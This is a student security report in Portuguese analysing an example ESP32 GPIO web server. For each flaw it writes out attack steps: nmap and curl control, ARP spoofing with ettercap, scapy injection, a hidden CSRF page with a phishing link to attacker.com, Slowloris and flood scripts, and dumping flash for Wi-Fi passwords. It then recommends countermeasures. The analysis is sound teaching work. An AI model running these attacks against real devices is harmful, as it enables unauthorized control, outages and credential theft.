# Análise estática do código ESP32 Web Server

**Atividade Ponderada - Semana 9**  
**Aluno:** Pietro Alkmin  
**Data:** 10 de Dezembro de 2025

---

## 1. Introdução

Este relatório apresenta uma análise estática do código de um servidor web implementado em um ESP32, baseado no exemplo de Rui Santos (Random Nerd Tutorials). O programa cria um servidor HTTP na porta 80 que permite controlar remotamente os GPIOs 26 e 27 por meio de requisições GET acessadas via navegador, sem mecanismos adicionais de segurança. 

A análise foca na identificação de vulnerabilidades inerentes ao código, considerando práticas de segurança, manipulação de entrada, exposição da rede e riscos de disponibilidade, integridade e confidencialidade.

---

## 2. Vulnerabilidades

### 2.1 Autenticação

**Vulnerabilidades código:**  
Sem autenticação, qualquer cliente que alcance o IP pode enviar comandos para GPIOs.

```cpp
if (header.indexOf("GET /26/on") >= 0) {
    digitalWrite(output26, HIGH);  // Sem verificação de usuário
}
```

**Possível ataque:** Acesso Não Autorizado e Controle Remoto

| Aspecto | Avaliação | Justificativa |
|---------|-----------|---------------|
| **Probabilidade** | **ALTA (80%)** | Ferramentas simples (nmap, curl), sem necessidade de credenciais |
| **Impacto** | **ALTO** | Controle total sobre dispositivos físicos conectados |
| **Risco** | **CRÍTICO (9.5/10)** | Sistema inaceitável para produção |

**Passo-a-passo:**

1. **Descobrir ESP32 na rede:**
```bash
nmap -sn 192.168.1.0/24
```

2. **Identificar porta 80 aberta:**
```bash
nmap -p 80 192.168.1.100
```

3. **Acessar via navegador:**
```
http://192.168.1.100
```

4. **Controlar via linha de comando:**
```bash
curl http://192.168.1.100/26/on
curl http://192.168.1.100/26/off
```

5. **Automatizar ataque:**
```python
import requests
while True:
    requests.get("http://192.168.1.100/26/on")
    requests.get("http://192.168.1.100/26/off")
```

---

### 2.2 Sem criptografia (HTTP plain)

**Vulnerabilidades código:**  
Tráfego em texto aberto (risco de sniffing).

```cpp
WiFiServer server(80);  // HTTP sem criptografia
```

**Possível ataque:** Man-in-the-Middle (MITM)

| Aspecto | Avaliação | Justificativa |
|---------|-----------|---------------|
| **Probabilidade** | **MÉDIA (50%)** | Requer ferramentas especializadas (Wireshark, Ettercap) |
| **Impacto** | **MUITO ALTO** | Todo tráfego visível, comandos modificáveis |
| **Risco** | **ALTO (8.0/10)** | Atacante intercepta e modifica requisições |

**Passo-a-passo:**

1. **ARP Spoofing:**
```bash
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
```

2. **Capturar tráfego HTTP:**
```bash
sudo tcpdump -i wlan0 -A 'tcp port 80 and host 192.168.1.100'
```

3. **Visualizar comandos em texto claro:**
```
GET /26/on HTTP/1.1
Host: 192.168.1.100
```

4. **Modificar requisições com mitmproxy:**
```bash
mitmproxy --mode transparent
# Interceptar GET /26/on e mudar para GET /26/off
```

5. **Injetar comandos maliciosos:**
```python
from scapy.all import *
send(IP(dst="192.168.1.100")/TCP(dport=80)/Raw(load=b"GET /27/on HTTP/1.1\r\n\r\n"))
```

---

### 2.3 Sem verificação de origem / CSRF

**Vulnerabilidades código:**  
Página usa GET para ações que mudam estado; suscetível a CSRF.

```cpp
client.println("<a href=\"/26/on\"><button>ON</button></a>");
// Sem tokens CSRF
```

**Possível ataque:** Cross-Site Request Forgery

| Aspecto | Avaliação | Justificativa |
|---------|-----------|---------------|
| **Probabilidade** | **MÉDIA-ALTA (60%)** | Engenharia social simples, técnica conhecida |
| **Impacto** | **MÉDIO-ALTO** | Execução não autorizada, vítima não percebe |
| **Risco** | **ALTO (7.0/10)** | Fácil de explorar via página maliciosa |

**Passo-a-passo:**

1. **Criar página maliciosa:**
```html
<!-- evil.html -->
<img src="http://192.168.1.100/26/on" style="display:none;">
<script>
    fetch('http://192.168.1.100/27/on');
</script>
```

2. **Hospedar página:**
```bash
python3 -m http.server 8080
```

3. **Enviar link por phishing:**
```
Email: "Você ganhou um prêmio! Clique aqui: http://attacker.com/evil.html"
```

4. **Loop automático:**
```javascript
setInterval(() => {
    fetch('http://192.168.1.100/26/on');
    setTimeout(() => fetch('http://192.168.1.100/26/off'), 1000);
}, 2000);
```

5. **Varredura de IPs locais:**
```javascript
for(let i=1; i<255; i++) {
    fetch(`http://192.168.1.${i}/26/on`, {mode: 'no-cors'});
}
```

---

### 2.4 Negligência de timeouts e controle de recursos

**Vulnerabilidades código:**  
Loop/timeout arriscado; sem limitação de conexões simultâneas.

```cpp
const long timeoutTime = 2000;
while (client.connected() && currentTime - previousTime <= timeoutTime) {
    header += c;  // Sem limite de tamanho!
}
```

**Possível ataque:** Negação de Serviço (DoS)

| Aspecto | Avaliação | Justificativa |
|---------|-----------|---------------|
| **Probabilidade** | **MÉDIA-ALTA (65%)** | Ferramentas DoS disponíveis, ESP32 com recursos limitados |
| **Impacto** | **ALTO** | Sistema inacessível, interrupção de serviços |
| **Risco** | **ALTO (8.5/10)** | Fácil sobrecarregar ESP32 |

**Passo-a-passo:**

1. **Ataque Slowloris:**
```python
import socket
sockets = []
for i in range(100):
    s = socket.socket()
    s.connect(('192.168.1.100', 80))
    s.send(b"GET / HTTP/1.1\r\n")
    sockets.append(s)

while True:
    for s in sockets:
        s.send(b"X-a: b\r\n")
```

2. **HTTP Flood:**
```bash
ab -n 10000 -c 100 http://192.168.1.100/
```

3. **Buffer overflow no header:**
```python
import socket
s = socket.socket()
s.connect(('192.168.1.100', 80))
s.send(b"GET / HTTP/1.1\r\nX: " + b"A"*1000000 + b"\r\n\r\n")
```

4. **Flood paralelo:**
```bash
seq 1 1000 | xargs -n1 -P100 curl http://192.168.1.100/26/on
```

5. **Verificar indisponibilidade:**
```bash
while true; do
    timeout 2 curl http://192.168.1.100 || echo "OFFLINE"
    sleep 1
done
```

---

### 2.5 Exposição de SSID/Password em código e log serial

**Vulnerabilidades código:**  
Código hardcoded facilita cópia; logs exibem IP e mensagens.

```cpp
const char* ssid = "MinhaRedeWiFi";
const char* password = "senha123";
Serial.println(WiFi.localIP());  // IP exposto
```

**Possível ataque:** Exposição de Credenciais WiFi

| Aspecto | Avaliação | Justificativa |
|---------|-----------|---------------|
| **Probabilidade** | **MÉDIA (40%)** | Alta se código público, média com acesso físico |
| **Impacto** | **CRÍTICO** | Compromete toda a rede WiFi |
| **Risco** | **ALTO (7.5/10)** | Acesso persistente à rede inteira |

**Passo-a-passo:**

1. **Buscar em repositórios:**
```bash
# GitHub search: "const char* password" ESP32
```

2. **Acesso serial (físico):**
```bash
screen /dev/ttyUSB0 115200
# Output: "Connecting to MinhaRedeWiFi_Corporativa"
```

3. **Dump da flash:**
```bash
esptool.py --port /dev/ttyUSB0 read_flash 0 0x400000 flash.bin
strings flash.bin | grep -A 2 "ssid\|password"
```

4. **Conectar à rede:**
```bash
nmcli device wifi connect "MinhaRedeWiFi_Corporativa" password "senha_extraida"
```

5. **Reconhecer rede interna:**
```bash
nmap -sn 192.168.10.0/24  # Acessar outros dispositivos
```

---

## 3. Tabela Consolidada de Ataques (Ordenada por Risco)

| # | Título do Ataque | Vulnerabilidade | Probabilidade | Impacto | Risco |
|---|------------------|-----------------|---------------|---------|-------|
| 1 | Acesso Não Autorizado | Sem Autenticação | 80% (Alta) | Alto | **CRÍTICO (9.5)** |
| 2 | Negação de Serviço (DoS) | Sem Controle de Recursos | 65% (Média-Alta) | Alto | **ALTO (8.5)** |
| 3 | Man-in-the-Middle | Sem Criptografia | 50% (Média) | Muito Alto | **ALTO (8.0)** |
| 4 | Exposição de Credenciais | Hardcoded + Logs | 40% (Média) | Crítico | **ALTO (7.5)** |
| 5 | CSRF | Sem Verificação Origem | 60% (Média-Alta) | Médio-Alto | **ALTO (7.0)** |

---

## 4. Recomendações de Contramedidas

### Prioridade Crítica:
- **Autenticação:** Implementar HTTP Basic/Digest Auth ou tokens de sessão
- **HTTPS:** Migrar para porta 443 com TLS/SSL
- **Rate Limiting:** Limitar requisições por IP (ex: 10 req/min)
- **Gerenciamento de Credenciais:** Usar WiFi Manager ou EEPROM criptografada

### Prioridade Alta:
- **Tokens CSRF:** Adicionar tokens em formulários
- **Validação de Entrada:** Limitar tamanho do header
- **Timeout Agressivo:** Reduzir para 500ms
- **Desabilitar Logs Serial:** Em produção

### Outras Medidas:
- Whitelist de IPs permitidos
- Implementar watchdog timer
- Monitoramento de anomalias
- OTA updates seguros

---

## 5. Conclusão

O código apresenta **5 vulnerabilidades críticas** resultando em **risco geral ALTO A CRÍTICO**. A ausência de autenticação (risco 9.5/10) é a falha mais grave, permitindo controle total por qualquer pessoa na rede. Recomenda-se implementação imediata de autenticação e HTTPS antes de deployment em produção.

---

## 6. Demonstração em Vídeo

**Link do vídeo de demonstração:** https://drive.google.com/file/d/13x02J__foXsZ5eRJW7MVzXtZNzZi8lxT/view?usp=drivesdk

O vídeo demonstra a implementação prática do servidor web ESP32 e exemplos de vulnerabilidades identificadas nesta análise.

---

## 7. Referências

- Random Nerd Tutorials: https://randomnerdtutorials.com/esp32-web-server-arduino-ide/
- OWASP IoT Top 10: https://owasp.org/www-project-internet-of-things/
- ESP32 Security: https://docs.espressif.com/projects/esp-idf/en/latest/esp32/security/
- NIST Cybersecurity Framework
